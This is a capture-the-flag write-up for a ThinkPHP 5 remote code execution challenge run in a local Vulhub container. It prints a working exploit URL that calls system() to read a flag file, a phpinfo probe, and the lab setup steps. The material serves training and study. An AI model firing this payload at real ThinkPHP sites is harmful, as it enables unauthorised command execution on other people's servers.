# Challenge 10: ThinkPHP

## How to Start
```bash
docker compose pull
docker compose up -d
```

---

## Description
This challenge exploits a **ThinkPHP** vulnerability that allows remote attackers to leverage `App.php` for arbitrary code execution using a crafted query string.

Example vulnerable query string:
```
s=index/\think\Request/input&filter=phpinfo&data=1
```

---

## Solution
The challenge can be solved with a single command after some research:  
```bash
http://localhost:8484/index.php?s=/Index/\think\app/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=cat%20/var/www/html/flag.txt
```

**Flag:**
```
flag{ThinkPHP_PWNED}
```

---

## Steps to Recreate

### 1. Clone Vulhub Repository
```bash
git clone https://github.com/vulhub/vulhub
```

### 2. Navigate to ThinkPHP RCE Directory
```bash
cd vulhub/thinkphp/5-rce
```

### 3. Insert the Flag
```bash
RUN echo "flag{ThinkPHP_PWNED}" > /var/www/html/flag.txt
```

### 4. Start the Container
```bash
docker-compose up -d
```

---

## Final Notes
This challenge shows how improper input validation in web frameworks can lead to full **Remote Code Execution (RCE)**. Keeping frameworks up to date is critical to prevent such exploits.
